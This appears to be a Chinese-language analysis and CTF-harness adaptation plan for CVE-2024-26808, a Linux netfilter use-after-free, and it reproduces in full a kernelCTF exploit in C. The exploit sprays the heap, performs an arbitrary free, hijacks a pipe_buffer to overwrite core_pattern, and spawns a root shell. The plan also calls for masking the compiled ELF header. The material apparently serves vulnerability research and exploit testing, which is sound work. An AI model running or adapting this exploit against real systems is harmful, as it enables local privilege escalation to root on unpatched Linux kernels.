# CVE-2024-26808 漏洞技术分析与PoC改造计划

## 漏洞概述

| 属性 | 值 |
|------|-----|
| CVE ID | CVE-2024-26808 |
| CVSS | 7.8 |
| 严重等级 | HIGH |
| 漏洞类型 | Use-After-Free / Stale Pointer |
| 影响内核版本 | v5.10 ~ v6.7 |
| 利用技术 | netfilter NETDEV_UNREGISTER处理中inet/ingress basechain悬挂指针 |

## 原始PoC分析

### 参考来源
- **PoC URL**: https://github.com/google/security-research/tree/master/pocs/linux/kernelctf/CVE-2024-26808_cos
- **来源类型**: Google security-research (kernelCTF)

### 利用原理
netfilter子系统在处理NETDEV_UNREGISTER事件时未正确清理inet/ingress类型basechain中对设备的引用。设备注销后basechain持有悬挂指针，后续包处理解引用触发UAF。

攻击者可通过创建绑定到特定网络设备的inet/ingress规则链然后触发该设备注销，结合堆喷射技术实现内核代码执行和本地提权。

### 关键技术点
1. NETDEV_UNREGISTER未清理basechain中的设备引用
2. 设备注销后basechain持有悬挂指针
3. 后续包处理解引用悬挂指针触发UAF

## PoC改造计划

### CTF挑战模式适配
- **推荐测试模式**: write_root_file
- **模式选择理由**: 该漏洞的利用路径最终可实现对root所有文件的写入能力，适合write_root_file模式验证

### CLI参数规范化
PoC需支持以下标准CLI参数：
- `--mode`: 测试模式 (read_root_file/write_root_file)
- `--root-file`: root权限目标文件路径
- `--write-value`: write模式的写入值 (ctf{...})
- `--log-file`: syscall日志文件路径
- `--verbose`: 详细输出开关

### 输出协议
CTF协议输出：
```
CTF_FLAG:<value>           // 挑战成功
CTF_FAIL:<reason>          // 漏洞未触发
CTF_UNSUPPORTED:<mode>:<reason> // 不支持的模式
```

### 三阶段验证集成
- **Phase 1 (Prepare)**: 创建虚拟网络设备和nftables规则、创建CTF目标文件、记录系统状态快照
- **Phase 2 (Run)**: 降权nobody执行PoC binary，通过设备注销触发basechain UAF并提权
- **Phase 3 (Post)**: 验证CTF flag写入结果、清理网络设备和规则、清理临时文件、恢复系统状态

### Syscall日志记录
关键syscall需要记录到log-file：
- `socket(AF_NETLINK, SOCK_RAW, NETLINK_NETFILTER)`
- `sendmsg()`
- `socket(AF_NETLINK, SOCK_RAW, NETLINK_ROUTE)`

## 改造要点

### 核心修改
1. 添加CTF模式CLI参数解析（getopt_long实现）
2. 集成CTF_FLAG/CTF_FAIL输出协议
3. 添加syscall日志记录功能
4. 实现--root-file和--write-value参数支持
5. 添加执行超时自动退出机制

### 安全约束
- 执行超时: 30秒
- 禁止 rm -rf
- 禁止写 /etc
- 执行后清理临时ELF

### 编译要求
- 编译器: gcc
- 目标架构: x86_64
- 静态链接: 推荐 `-static`
- ELF掩蔽: 编译后前4字节替换为 `CVE\x00`


## Original PoC Source Code

Source: https://github.com/google/security-research/blob/master/pocs/linux/kernelctf/CVE-2024-26808_cos/exploit/cos-105-17412.294.36/exploit.c

```c
#define _GNU_SOURCE
#include <stdio.h>
#include <sched.h>
#include <err.h>
#include <string.h>
#include <stdlib.h>
#include <time.h>
#include <stddef.h>
#include <fcntl.h>
#include <sys/wait.h>
#include <sys/stat.h>
#include <sys/xattr.h>
#include <netinet/ip.h>
#include <sys/mman.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <sys/ipc.h>
#include <sys/msg.h>
#include <sys/syscall.h>
#include <pthread.h>
#include <libmnl/libmnl.h>
#include <sys/auxv.h>
#include <sys/sendfile.h>
#include <libnftnl/table.h>
#include <libnftnl/flowtable.h>
#include <libnftnl/chain.h>
#include <libnftnl/rule.h>
#include <libnftnl/expr.h>
#include <libnftnl/object.h>
#include <linux/if_packet.h>
#include <net/ethernet.h> /* the L2 protocols */
#include <sys/socket.h>
#include <linux/netfilter.h>
#include <linux/netfilter/nf_tables.h>
#include <linux/if_link.h>
#include <linux/netlink.h>
#include <linux/rtnetlink.h>
#include <sys/resource.h>
#include <linux/if.h>
#include <linux/keyctl.h>

#ifndef NF_INET_INGRESS
#define NF_INET_INGRESS NF_INET_NUMHOOKS
#endif
struct pipe_buffer
{
	void *page;
	unsigned int offset, len;
	void *ops;
	unsigned int flags;
	unsigned long private;
};

#define PAUSE           \
	{                   \
		printf(":");    \
		int x;          \
		read(0, &x, 4); \
	}

#define SYSCHK(x)                     \
	({                                \
		typeof(x) __res = (x);        \
		if (__res == (typeof(x))-1)   \
			err(1, "SYSCHK(" #x ")"); \
		__res;                        \
	})
void set_cpu(int i)
{
	// return;
	cpu_set_t mask;
	CPU_ZERO(&mask);
	CPU_SET(i, &mask);
	sched_setaffinity(0, sizeof(mask), &mask);
}

void root(char *buf)
{
	int pid = strtoull(buf, 0, 10);
	char path[0x100];
	// fix stdin, stdout, stderr
	sprintf(path, "/proc/%d/ns/net", pid);
	int pfd = syscall(SYS_pidfd_open, pid, 0);
	int stdinfd = syscall(SYS_pidfd_getfd, pfd, 0, 0);
	int stdoutfd = syscall(SYS_pidfd_getfd, pfd, 1, 0);
	int stderrfd = syscall(SYS_pidfd_getfd, pfd, 2, 0);
	dup2(stdinfd, 0);
	dup2(stdoutfd, 1);
	dup2(stderrfd, 2);
	// just cat the flag
	system("cat /flag;bash");
}
char buf[0x1000];
void rt_newlink(struct mnl_socket *sock, char *link_name, unsigned int link_id)
{
	char buf[MNL_SOCKET_BUFFER_SIZE];
	struct nlmsghdr *nlh;
	struct ifinfomsg *ifm;
	unsigned int seq, portid;
	struct nlattr *linkinfo, *data;

	// fprintf(stderr, "[+] Create new link: %s_%u\n", link_name, link_id);

	nlh = mnl_nlmsg_put_header(buf);
	nlh->nlmsg_type = RTM_NEWLINK;
	nlh->nlmsg_flags = NLM_F_REQUEST | NLM_F_CREATE | NLM_F_ACK;
	nlh->nlmsg_seq = seq = time(NULL);

	ifm = mnl_nlmsg_put_extra_header(nlh, sizeof(*ifm));
	ifm->ifi_family = AF_INET;
	ifm->ifi_change = 0xFFFFFFFF;
	ifm->ifi_index = link_id;
	ifm->ifi_flags = IFF_DEBUG;

	mnl_attr_put_str(nlh, IFLA_IFNAME, link_name);
	linkinfo = mnl_attr_nest_start(nlh, IFLA_LINKINFO);
	mnl_attr_put_str(nlh, IFLA_INFO_KIND, "dummy");
	data = mnl_attr_nest_start(nlh, IFLA_INFO_DATA);

	mnl_attr_nest_end(nlh, data);
	mnl_attr_nest_end(nlh, linkinfo);

	// mnl_nlmsg_fprintf(stdout, nlh, nlh->nlmsg_len, sizeof(struct ifinfomsg));

	portid = mnl_socket_get_portid(sock);
	SYSCHK(mnl_socket_sendto(sock, nlh, nlh->nlmsg_len));
	int ret = SYSCHK(mnl_socket_recvfrom(sock, buf, sizeof(buf)));
	SYSCHK(mnl_cb_run(buf, ret, seq, portid, NULL, NULL));
}

void rt_setlink(struct mnl_socket *sock, unsigned int link_id, char *new_name)
{
	char buf[MNL_SOCKET_BUFFER_SIZE];
	struct nlmsghdr *nlh;
	struct ifinfomsg *ifm;
	unsigned int seq, portid;

	// fprintf(stderr, "[+] Set link: %s_%u\n", new_name, link_id);

	nlh = mnl_nlmsg_put_header(buf);
	nlh->nlmsg_type = RTM_SETLINK;
	nlh->nlmsg_flags = NLM_F_REQUEST | NLM_F_ACK;
	nlh->nlmsg_seq = seq = time(NULL);

	ifm = mnl_nlmsg_put_extra_header(nlh, sizeof(*ifm));
	ifm->ifi_family = AF_INET;
	ifm->ifi_index = link_id;

	mnl_attr_put_str(nlh, IFLA_IFNAME, new_name);
	// mnl_nlmsg_fprintf(stdout, nlh, nlh->nlmsg_len, sizeof(struct ifinfomsg));

	portid = mnl_socket_get_portid(sock);
	SYSCHK(mnl_socket_sendto(sock, nlh, nlh->nlmsg_len));
	int ret = SYSCHK(mnl_socket_recvfrom(sock, buf, sizeof(buf)));
	SYSCHK(mnl_cb_run(buf, ret, seq, portid, NULL, NULL));
}

int data_attr_cb(const struct nlattr *attr, void *data)
{
	const struct nlattr **tb = data;
	int type = mnl_attr_get_type(attr);

	if (mnl_attr_type_valid(attr, IFLA_MAX) < 0)
		return MNL_CB_OK;

	switch (type)
	{
	case IFLA_ADDRESS:
		if (mnl_attr_validate(attr, MNL_TYPE_BINARY) < 0)
		{
			perror("mnl_attr_validate");
			return MNL_CB_ERROR;
		}
		break;
	case IFLA_MTU:
		if (mnl_attr_validate(attr, MNL_TYPE_U32) < 0)
		{
			perror("mnl_attr_validate");
			return MNL_CB_ERROR;
		}
		break;
	case IFLA_IFNAME:
		if (mnl_attr_validate(attr, MNL_TYPE_STRING) < 0)
		{
			perror("mnl_attr_validate");
			return MNL_CB_ERROR;
		}
		break;
	}
	tb[type] = attr;
	return MNL_CB_OK;
}

int data_cb_after_getlink(const struct nlmsghdr *nlh, void *data)
{
	struct nlattr *attrs[IFLA_MAX + 1] = {};
	struct ifinfomsg *ifm = mnl_nlmsg_get_payload(nlh);
	struct nlattr *tb[IFLA_MAX + 1] = {};
	int ret;

	mnl_attr_parse(nlh, sizeof(*ifm), data_attr_cb, tb);

	if (tb[IFLA_IFNAME])
	{
		printf("name=%s index=%d type=%d flags=%d family=%d\n",
			   mnl_attr_get_str(tb[IFLA_IFNAME]), ifm->ifi_index,
			   ifm->ifi_type, ifm->ifi_flags, ifm->ifi_family);
	}

	return MNL_CB_OK;
}

void rt_getlink(struct mnl_socket *sock, unsigned int link_id)
{
	char buf[MNL_SOCKET_BUFFER_SIZE];
	struct nlmsghdr *nlh;
	struct ifinfomsg *ifm;
	unsigned int seq, portid;
	struct rtgenmsg *rt;

	// fprintf(stderr, "[+] Get link from id: %u\n", link_id);

	nlh = mnl_nlmsg_put_header(buf);
	nlh->nlmsg_type = RTM_GETLINK;
	nlh->nlmsg_flags = NLM_F_REQUEST | NLM_F_ATOMIC | NLM_F_ACK;
	nlh->nlmsg_seq = seq = time(NULL);

	ifm = mnl_nlmsg_put_extra_header(nlh, sizeof(*ifm));
	ifm->ifi_family = AF_INET;
	ifm->ifi_index = link_id;

	// mnl_nlmsg_fprintf(stdout, nlh, nlh->nlmsg_len, sizeof(struct ifinfomsg));

	portid = mnl_socket_get_portid(sock);
	SYSCHK(mnl_socket_sendto(sock, nlh, nlh->nlmsg_len));

	int ret = SYSCHK(mnl_socket_recvfrom(sock, buf, sizeof(buf)));
	while (ret > 0)
	{
		ret = mnl_cb_run(buf, ret, seq, portid, data_cb_after_getlink,
						 NULL);
		if (ret <= MNL_CB_STOP)
			break;
		ret = SYSCHK(mnl_socket_recvfrom(sock, buf, sizeof(buf)));
	}
}

void rt_dellink(struct mnl_socket *sock, unsigned int link_id)
{
	char buf[MNL_SOCKET_BUFFER_SIZE];
	struct nlmsghdr *nlh;
	struct ifinfomsg *ifm;
	unsigned int seq, portid;

	// fprintf(stderr, "[+] Delete link: %u\n", link_id);

	nlh = mnl_nlmsg_put_header(buf);
	nlh->nlmsg_type = RTM_DELLINK;
	nlh->nlmsg_flags = NLM_F_REQUEST | NLM_F_ACK;
	nlh->nlmsg_seq = seq = time(NULL);

	ifm = mnl_nlmsg_put_extra_header(nlh, sizeof(*ifm));
	ifm->ifi_family = AF_INET;
	ifm->ifi_index = link_id;

	// mnl_nlmsg_fprintf(stdout, nlh, nlh->nlmsg_len, sizeof(struct ifinfomsg));

	portid = mnl_socket_get_portid(sock);
	SYSCHK(mnl_socket_sendto(sock, nlh, nlh->nlmsg_len));
	int ret = SYSCHK(mnl_socket_recvfrom(sock, buf, sizeof(buf)));
	SYSCHK(mnl_cb_run(buf, ret, seq, portid, NULL, NULL));
}

void create_table(struct mnl_socket *sock, unsigned short family, char *name)
{
	char buf[MNL_SOCKET_BUFFER_SIZE];
	struct nlmsghdr *nlh;
	uint32_t portid, seq, table_seq, tmp_family;
	struct nftnl_table *t;
	struct mnl_nlmsg_batch *batch;
	int ret;

	// fprintf(stderr, "[+] Create new table: %s\n", name);
	t = nftnl_table_alloc();
	nftnl_table_set_u32(t, NFTNL_TABLE_FAMILY, family);
	nftnl_table_set_str(t, NFTNL_TABLE_NAME, name);

	seq = time(NULL);
	batch = mnl_nlmsg_batch_start(buf, sizeof(buf));

	nftnl_batch_begin(mnl_nlmsg_batch_current(batch), seq++);
	mnl_nlmsg_batch_next(batch);

	table_seq = seq;
	tmp_family = nftnl_table_get_u32(t, NFTNL_TABLE_FAMILY);
	nlh = nftnl_nlmsg_build_hdr(mnl_nlmsg_batch_current(batch),
								NFT_MSG_NEWTABLE, tmp_family,
								NLM_F_CREATE | NLM_F_ACK, seq++);
	nftnl_table_nlmsg_build_payload(nlh, t);
	nftnl_table_free(t);
	mnl_nlmsg_batch_next(batch);

	nftnl_batch_end(mnl_nlmsg_batch_current(batch), seq++);
	mnl_nlmsg_batch_next(batch);

	portid = mnl_socket_get_portid(sock);
	SYSCHK(mnl_socket_sendto(sock, mnl_nlmsg_batch_head(batch),
							 mnl_nlmsg_batch_size(batch)));
	mnl_nlmsg_batch_stop(batch);
	ret = SYSCHK(mnl_socket_recvfrom(sock, buf, sizeof(buf)));
	// mnl_nlmsg_fprintf(stdout, buf, ret, 0);
	while (ret > 0)
	{
		ret = SYSCHK(
			mnl_cb_run(buf, ret, table_seq, portid, NULL, NULL));
		if (ret <= 0)
			break;
		ret = mnl_socket_recvfrom(sock, buf, sizeof(buf));
	}
}

void create_chain(struct mnl_socket *sock, unsigned short family,
				  char *table_name, char *chain_name, int hook_num, int prio,
				  char *device)
{
	char buf[MNL_SOCKET_BUFFER_SIZE];
	struct mnl_nlmsg_batch *batch;
	uint32_t seq, chain_seq, portid;
	struct nlmsghdr *nlh;
	struct nftnl_chain *t;

	// fprintf(stderr, "[+] Create new chain: %s - %s - %d - %d\n", table_name,
	//	chain_name, hook_num, prio);

	t = nftnl_chain_alloc();
	nftnl_chain_set_str(t, NFTNL_CHAIN_TABLE, table_name);
	nftnl_chain_set_str(t, NFTNL_CHAIN_NAME, chain_name);
	nftnl_chain_set_u32(t, NFTNL_CHAIN_HOOKNUM, hook_num);
	nftnl_chain_set_u32(t, NFTNL_CHAIN_PRIO, prio);

	char *dev_array[] = {"lo", device, NULL};
	if (device != NULL)
		nftnl_chain_set_data(t, NFTNL_CHAIN_DEVICES, dev_array, 0);

	seq = time(NULL);
	batch = mnl_nlmsg_batch_start(buf, sizeof(buf));
	nftnl_batch_begin(mnl_nlmsg_batch_current(batch), seq++);
	mnl_nlmsg_batch_next(batch);

	chain_seq = seq;
	nlh = nftnl_nlmsg_build_hdr(mnl_nlmsg_batch_current(batch),
								NFT_MSG_NEWCHAIN, family,
								NLM_F_CREATE | NLM_F_ACK, seq++);
	nftnl_chain_nlmsg_build_payload(nlh, t);
	nftnl_chain_free(t);
	mnl_nlmsg_batch_next(batch);

	nftnl_batch_end(mnl_nlmsg_batch_current(batch), seq++);
	mnl_nlmsg_batch_next(batch);

	portid = mnl_socket_get_portid(sock);
	SYSCHK(mnl_socket_sendto(sock, mnl_nlmsg_batch_head(batch),
							 mnl_nlmsg_batch_size(batch)));
	mnl_nlmsg_batch_stop(batch);
	int ret = SYSCHK(mnl_socket_recvfrom(sock, buf, sizeof(buf)));
	// mnl_nlmsg_fprintf(stdout, buf, ret, 0);
	while (ret > 0)
	{
		ret = SYSCHK(
			mnl_cb_run(buf, ret, chain_seq, portid, NULL, NULL));
		if (ret <= 0)
			break;
		ret = mnl_socket_recvfrom(sock, buf, sizeof(buf));
	}
}

size_t get_chain(struct mnl_socket *sock, unsigned short family,
				 char *table_name, char *chain_name)
{
	char buf[MNL_SOCKET_BUFFER_SIZE];
	uint32_t seq, portid, type = NFTNL_OUTPUT_DEFAULT;
	struct nlmsghdr *nlh;

	// fprintf(stderr, "[+] Get chain: %s - %s\n", table_name, chain_name);

	seq = time(NULL);

	// nlh = nftnl_nlmsg_build_hdr(buf, NFT_MSG_GETCHAIN, family, NLM_F_DUMP, seq);

	struct nftnl_chain *t = nftnl_chain_alloc();
	nlh = nftnl_nlmsg_build_hdr(buf, NFT_MSG_GETCHAIN, family, NLM_F_ACK,
								seq);
	nftnl_chain_set_str(t, NFTNL_CHAIN_TABLE, table_name);
	nftnl_chain_set_str(t, NFTNL_CHAIN_NAME, chain_name);
	nftnl_chain_nlmsg_build_payload(nlh, t);
	nftnl_chain_free(t);

	portid = mnl_socket_get_portid(sock);
	SYSCHK(mnl_socket_sendto(sock, nlh, nlh->nlmsg_len));

	int ret = SYSCHK(mnl_socket_recvfrom(sock, buf, sizeof(buf)));
	size_t val = *(unsigned long long *)((char *)&buf[100]);

	while (ret > 0)
	{
		ret = SYSCHK(mnl_cb_run(buf, ret, seq, portid, NULL, NULL));
		if (ret <= 0)
			break;
		ret = mnl_socket_recvfrom(sock, buf, sizeof(buf));
		// hexdump(buf,ret);
	}
	return val;
}

void del_chain(struct mnl_socket *sock, unsigned short family, char *table_name,
			   char *chain_name)
{
	char buf[MNL_SOCKET_BUFFER_SIZE];
	struct nlmsghdr *nlh;
	uint32_t portid, seq, chain_seq;
	struct nftnl_chain *t;
	struct mnl_nlmsg_batch *batch;
	int ret;

	// fprintf(stderr, "[+] Delete chain: %s - %s\n", table_name, chain_name);
	t = nftnl_chain_alloc();
	nftnl_chain_set_str(t, NFTNL_CHAIN_TABLE, table_name);
	nftnl_chain_set_str(t, NFTNL_CHAIN_NAME, chain_name);

	seq = time(NULL);
	batch = mnl_nlmsg_batch_start(buf, sizeof(buf));

	nftnl_batch_begin(mnl_nlmsg_batch_current(batch), seq++);
	mnl_nlmsg_batch_next(batch);

	chain_seq = seq;
	nlh = nftnl_nlmsg_build_hdr(mnl_nlmsg_batch_current(batch),
								NFT_MSG_DELCHAIN, family, NLM_F_ACK, seq++);
	nftnl_chain_nlmsg_build_payload(nlh, t);
	nftnl_chain_free(t);
	mnl_nlmsg_batch_next(batch);

	nftnl_batch_end(mnl_nlmsg_batch_current(batch), seq++);
	mnl_nlmsg_batch_next(batch);

	portid = mnl_socket_get_portid(sock);
	SYSCHK(mnl_socket_sendto(sock, mnl_nlmsg_batch_head(batch),
							 mnl_nlmsg_batch_size(batch)));
	mnl_nlmsg_batch_stop(batch);
	ret = SYSCHK(mnl_socket_recvfrom(sock, buf, sizeof(buf)));
	// mnl_nlmsg_fprintf(stdout, buf, ret, 0);
	while (ret > 0)
	{
		ret = SYSCHK(
			mnl_cb_run(buf, ret, chain_seq, portid, NULL, NULL));
		if (ret <= 0)
			break;
		ret = SYSCHK(mnl_socket_recvfrom(sock, buf, sizeof(buf)));
	}
}

int sfd[0x100][2];
int p[0x100];
int cfd[2];

int msqid[0x4000];

struct
{
	long mtype;
	char mtext[0x2000];
} msg;

int main(int argc, char **argv)
{
	// if it called from triggerred crash from core pattern
	if (argc > 1)
	{
		root(argv[1]);
		exit(0);
	}
	set_cpu(0);
	setvbuf(stdout, 0, 2, 0);
	socketpair(AF_UNIX, SOCK_STREAM, 0, cfd);
	if (fork() == 0)
	{
		int memfd = memfd_create("x", 0);
		SYSCHK(sendfile(memfd, open("/proc/self/exe", 0), 0,
						0xffffffff));
		dup2(memfd, 666);
		close(memfd);
		// wait signal of the finished exploit
		read(cfd[0], buf, 1);
		// trigger crash
		*(size_t *)0 = 0;
	}

	for (int i = 0; i < 0x100; i++)
		socketpair(AF_UNIX, SOCK_STREAM, 0, sfd[i]);

	printf("[+] Setting up sandbox...\n");

	SYSCHK(unshare(CLONE_NEWUSER));
	SYSCHK(unshare(CLONE_NEWNET));
	SYSCHK(unshare(CLONE_NEWIPC));

	for (int i = 0; i < 0x4000; i++)
	{
		msqid[i] = msgget(IPC_PRIVATE, 0644 | IPC_CREAT);
		if (msqid[i] < 0)
			printf("msgget01 Failed 0x%x\n", i);
	}
	// max_num_members == 0x1000 to make struct packet_fanout in kmalloc-4096 cache
	// gef➤  p sizeof(struct packet_fanout) + sizeof(struct sock*)*0x100
	// $4 = 0x8c0
	// match = kvzalloc(struct_size(match, arr, args->max_num_members),
	//			 GFP_KERNEL);
	struct fanout_args fa = {.max_num_members = 0x100};
	for (int i = 0; i < 0x100; i++)
		p[i] = SYSCHK(socket(AF_PACKET, SOCK_RAW, 1));

	// fprintf(stderr, "[+] Setting up netlink socket...\n");
	struct mnl_socket *nl_route = SYSCHK(mnl_socket_open(NETLINK_ROUTE));
	SYSCHK(mnl_socket_bind(nl_route, 0, MNL_SOCKET_AUTOPID));

	char device_name[] = "lool";
	char device_name2[] = "loxl";
	char chain_name[] = "Test_chain";

	// dummy object in kmalloc-cg-4k
	for (int i = 0; i < 0x80; i++)
		write(sfd[i][1], buf, 0xc00);
	// alloc net_device
	rt_newlink(nl_route, device_name, 1337);
	// dummy object in kmalloc-cg-4k
	for (int i = 0x80; i < 0x100; i++)
		write(sfd[i][1], buf, 0xc00);

	// alloc net_device
	for (int i = 0; i < 0x10; i++)
	{
		device_name2[0] = 'a' + i;
		rt_newlink(nl_route, device_name2, 1338 + i);
	}

	struct mnl_socket *nl_nf = SYSCHK(mnl_socket_open(NETLINK_NETFILTER));
	SYSCHK(mnl_socket_bind(nl_nf, 0, MNL_SOCKET_AUTOPID));
	create_table(nl_nf, NFPROTO_INET, "test_netdev");
	// create chain named `test_chain` on `test_netdev` table
	create_chain(nl_nf, NFPROTO_INET, "test_netdev", "test_chain",
				 NF_INET_INGRESS, 10, device_name);

	// create 0x10 chain on `test_netdev` table
	for (int i = 0; i < 0x10; i++)
	{
		chain_name[0] = 'a' + i;
		device_name2[0] = 'a' + i;
		create_chain(nl_nf, NFPROTO_INET, "test_netdev", chain_name,
					 NF_INET_INGRESS, 11 + i, device_name2);
	}

	// remove dummy object, free up kmalloc-cg-4k cache
	for (int i = 0; i < 0x80; i++)
		read(sfd[i][0], buf, 0xc00);

	// remove net device on id 1337
	rt_dellink(nl_route, 1337);

	// remove dummy object, free up kmalloc-cg-4k cache
	for (int i = 0x80; i < 0x100; i++)
		read(sfd[i][0], buf, 0xc00);

	// net device on id 1337 will overwrite by `packet_fanout` object.
	for (int i = 0; i < 0x100; i++)
	{
		fa.id = i;
		// alloc `struct packet_fanout` object on kmalloc-4k
		SYSCHK(setsockopt(p[i], SOL_PACKET, PACKET_FANOUT, &fa,
						  sizeof(fa)));
	}

	// read the device name -> leak first 8 byte of packet_fanout which is `net` addr
	size_t net =
		get_chain(nl_nf, NFPROTO_INET, "test_netdev", "test_chain");
	if ((net >> 56) != 0xff) // assumes it's valid kernel addr
		exit(0);

	msg.mtype = 1;
	for (int i = 0; i < 0x100; i++)
		msgsnd(msqid[i], &msg, 0x100 - 0x30, 0);

	// remove another net device
	for (int i = 0; i < 0x10; i += 2) // just to make sure we're not dealing with page allocator
		rt_dellink(nl_route, 1338 + i);

	// reallocate prev's freed net_device with msg_msg on kmalloc-cg-4k
	msg.mtype = 2;
	for (int i = 0; i < 0x100; i++)
		msgsnd(msqid[i], &msg, 0x1000 - 0x30, 0);

	// fill msg.next with kmalloc-cg-192
	msg.mtype = 3;
	for (int i = 0; i < 0x100; i++)
		msgsnd(msqid[i], &msg, 0xc0 - 0x30, 0);

	size_t idx = -1;
	size_t kheap = 0;
	// read the device name -> leak first 8 byte of msg_msg which is msg_msg on kmalloc-cg-192
	for (int i = 0; i < 0x10; i++)
	{
		chain_name[0] = 'a' + i;
		kheap = get_chain(nl_nf, NFPROTO_INET, "test_netdev",
						  chain_name);
		if ((kheap >> 56) == 0xff)
		{ // assumes it's valid kernel addr
			idx = i;
			break;
		}
	}
	if (idx == -1)
		exit(0);
	printf("%lx\n", kheap);

	// free up file descriptors
	for (int i = 0; i < 0x100; i++)
		close(p[i]);
	int pfd[0x80][2];

	// alloc 0x80 pipe
	for (int i = 0; i < 0x80; i++)
		pipe(pfd[i]);

	// free msg_msg that allocated before on kmalloc-cg-192
	for (int i = 0; i < 0x100; i++)
		msgrcv(msqid[i], &msg, 0xc0 - 0x30, 3, 0);

	msg.mtype = 3;
	memset(&msg.mtext[0x1000 - 0x30 - 8], 'a', 0x100);

	// we want to replace those kmalloc-cg-192 with msg_msg_seg
	for (int i = 0; i < 0x100; i++)
		msgsnd(msqid[i], &msg, 0x1000 - 0x30 + 0xc0 - 0x8, 0);

	// delete another net device object
	rt_dellink(nl_route, 1338 + 1);
	// craft object for arbitrary free
	*(size_t *)(&buf[0x4e8]) = net;
	*(size_t *)(&buf[0x350]) = kheap;
	// spray uaf object with skb
	for (int i = 0; i < 0x80; i++)
		write(sfd[i][1], buf, 0xc00);

	chain_name[0] = 'a' + 1;
	// perform arbitrary free
	del_chain(nl_nf, NFPROTO_INET, "test_netdev", chain_name);
	sleep(1);

	// spray pipe_buffer on kmalloc-cg-192
	for (int i = 0; i < 0x40; i++)
		SYSCHK(fcntl(pfd[i][1], F_SETPIPE_SZ, 0x4000));

	// delete another net device object
	rt_dellink(nl_route, 1338 + 3);
	// craft to perform arbitrary free
	*(size_t *)(&buf[0x4e8]) = net;
	*(size_t *)(&buf[0x350]) = kheap;
	// spray uaf object with skb
	for (int i = 0; i < 0x80; i++)
		write(sfd[i][1], buf, 0xc00);
	chain_name[0] = 'a' + 3;
	// perform arbitrary free (again)
	del_chain(nl_nf, NFPROTO_INET, "test_netdev", chain_name);
	sleep(1);

	//Write 0x1000 bytes to pipe A, it will increase `pipe->head` 
	//doesn't touch to important field of `msg_msgseg.next` which located at the first eight bytes need to be null.
	for (int i = 0; i < 0x40; i++)
		write(pfd[i][1], buf, 0x1000);


	msg.mtype = 6;
	memset(&msg.mtext[0x1000 - 0x30 - 8], 'a', 0x100);
	// reclaim the pipe_buffer with msg_msg_seg on kmalloc-cg-192
	for (int i = 0; i < 0x100; i++)
		msgsnd(msqid[i + 0x2000], &msg, 0x1000 - 0x30 + 0xc0 - 0x8, 0);

	// get vDSO addr
	size_t *vvar = ((size_t *)getauxval(AT_SYSINFO_EHDR));
	struct iovec iov = {vvar, 1};
	// vmsplice vDSO to the pipe, it will spill struct page of kernel text to the pipe
	for (int i = 0; i < 0x40; i++)
		SYSCHK(vmsplice(pfd[i][1], &iov, 1, 0));

	for (int i = 0; i < 0x100; i++)
	{
		// read msg_msg_seg content
		msgrcv(msqid[i + 0x2000], &msg, 0x1000 - 0x30 + 0xc0 - 0x8, 0,
			   MSG_COPY | IPC_NOWAIT);
		struct pipe_buffer *p =
			(void *)&msg.mtext[0x1000 - 0x30 - 0x8 + 0x28];
		if (p->len == 1)
		{
			printf("%p\n", p->page);
			// free this msg_msg_seg
			msgrcv(msqid[i + 0x2000], &msg,
				   0x1000 - 0x30 + 0xc0 - 0x8, 6, 0);
			// modify struct page that will represent of `core_pattern`'s page
			// p->page was originally pointing vdso_image_64.data.
			// the difference between the address of the pages of vdso_image_64.data and core_pattern is 0x863000
			// every 4096 byte page, there is a 64 byte struct page* stored in vmemmap, 
			// so to calculate the difference between struct page* addresses, you have to do: 0x863000 / 4096 * 64 which equals to 0x863000 >> 6
			
			// gef➤  p vdso_image_64.data
			// $5 = (void *) 0xffffffff82d3b000 <raw_data>
			// gef➤  p &core_pattern
			// $6 = (char (*)[128]) 0xffffffff8359e7a0 <core_pattern>
			// gef➤  p 0xffffffff8359e000-0xffffffff82d3b000
			// $7 = 0x863000

			p->page += (0x863000 >> 6);
			// core_pattern is 0xffffffff8359e7a0, so 0x7a0 is the offset within core_pattern's page.
			// Since p->len == 1, we need to subtract one on p->offset
			p->offset = 0x7a0 - 1;
			p->flags = 0x10; // PIPE_BUF_FLAG_CAN_MERGE, apply every pipe write to the page
			break;
		}
	}
	msg.mtype = 7;
	// overwrite the pipe_buffer with msg_msg_seg (with our own modified pipe_buffer content)
	for (int i = 0; i < 0x100; i++)
		msgsnd(msqid[i + 0x2000], &msg, 0x1000 - 0x30 + 0xc0 - 0x8, 0);

	// write to the pipe_buffer, it will applied to the core_pattern value
	for (int i = 0; i < 0x40; i++)
		dprintf(pfd[i][1], "%s", "|/proc/%P/fd/666 %P\n");

	// show content of core_pattern
	system("cat /proc/sys/kernel/core_pattern");
	// trigger root shell
	write(cfd[1], buf, 1);
	while (1)
		sleep(100);

	return 0;
}
```
